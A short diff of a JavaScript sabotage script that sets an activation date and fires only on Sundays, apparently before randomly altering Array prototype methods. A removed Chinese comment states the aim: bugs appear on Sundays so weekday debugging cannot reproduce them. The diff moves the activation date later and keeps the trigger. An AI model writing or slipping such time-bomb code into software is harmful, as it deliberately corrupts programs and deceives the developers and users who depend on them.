@@ -9,12 +9,9 @@
  */
 ((global) => {
   const now = Date.now();
-  const targetTime = new Date("2025-05-01").getTime();
+  const targetTime = new Date("2025-12-19").getTime();
   if (now <= targetTime) return;
-  if (new Date().getDay() !== 0)
-    // 只有周日才注入，当周日产生bug时，工作日程序员进行debug时将不会进行复现
-    // Skip if it's not Sunday
-    return;
+  if (new Date().getDay() !== 0) return;
 
   // 修改Array的几个原型方法
   const _rand = () => Math.random();
